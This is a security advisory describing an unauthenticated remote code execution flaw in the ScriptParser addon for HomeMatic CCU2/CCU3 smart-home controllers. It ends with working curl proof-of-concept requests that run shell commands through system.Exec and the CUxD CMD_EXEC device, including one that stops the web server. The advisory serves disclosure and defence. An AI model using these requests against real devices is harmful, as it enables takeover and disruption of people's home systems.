# Background

From [Github 'ScriptParser' AddOn project page](https://github.com/litti/scriptparser) it's almost clear that there is a known security issue, but a lot of people have installed the AddOn which opens the vulnerability:<br>
Deutsch:
>Da immer wieder nach einer besseren Möglichkeit gesucht wird, Scripte zu editieren, habe ich den alten Scriptparser mal in ein Installationspaket gepackt. Einfach als Zusatzsoftware installieren/deinstallieren. Aufruf über den Browser mit http://IPAdressederCCU/addons/script
>Achtung: Der Parser ist nicht passwortgesichert und arbeitet auch nicht auf Session-Basis! Mit anderen Worten, wer Zugriff auf den Port 80 der CCU hat, kann den aufrufen und Skripte ausführen!

English:
>Since there is always the search for a better way to edit scripts, I packed the old script parser into an installation package. Just install/uninstall it as additional software. Call via the browser with http://IPAdressederCCU/addons/script
>Attention: The parser is not password protected and does not work on session basis! In other words, if you have access to port 80 of the CCU, you can call it and execute scripts!

From [eQ-3 vendor's website for CCU2](https://www.eq-3.com/products/homematic/control-units-and-gateways/homematic-central-control-unit-ccu2.html):<br>
HomeMatic Central Control Unit CCU2

Homematic Central Control Unit is the central element of your Homematic system, offering a whole range of control, monitoring and configuration options for all the Homematic devices in your installation<br>
[....]<br>

From [eQ-3 vendor's website for CCU3](https://www.homematic-ip.com/en/products/detail/smart-home-central-control-unit-ccu3.html):<br>
The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). Thanks to local configuration and operation as well as the option to create direct device connections, reliable and fail-proof operation of the smart home system is guaranteed at all times – even in the event of Internet failures.<br>

# Issue Description

While analyzing the CCU web interface based on given page files in file system path /www, this is another Improper Access Control resulting into Remote Code Execution vulnerability located in 'ScriptParser' AddOn, if it's installed. This vulnerability can be exploited by unauthenticated attackers with access to the web interface.<br>

The following HTTP requests in Web Browser illustrates the attack vectors:

1. RCE with Homematic undocumented internal system.Exec() call:<br>
```
curl -X POST -i 'http://1.2.3.4/addons/script/exec.cgi' --data 'var x=system.Exec("sleep 4;");'
curl -X POST -i 'http://1.2.3.4/addons/script/exec.cgi' --data 'var x=system.Exec("/bin/touch /tmp/testfile;");'
curl -X POST -i 'http://1.2.3.4/addons/script/exec.cgi' --data 'var x=system.Exec("/etc/init.d/S50lighttpd stop;");'
```

2. If also the popular CUxD AddOn is installed, another RCE is possible by abuse of the virtual CUxD'CMD_EXEC' device:<br>
```
curl -X POST -i 'http://1.2.3.4/addons/script/exec.cgi' --data 'var x=dom.GetObject("CUxD.CUX2801001:1.CMD_EXEC").State("/bin/touch /tmp/testfile");'
curl -X POST -i 'http://1.2.3.4/addons/script/exec.cgi' --data 'var x=dom.GetObject("CUxD.CUX2801001:1.CMD_EXEC").State("/etc/init.d/S50lighttpd stop");'
```
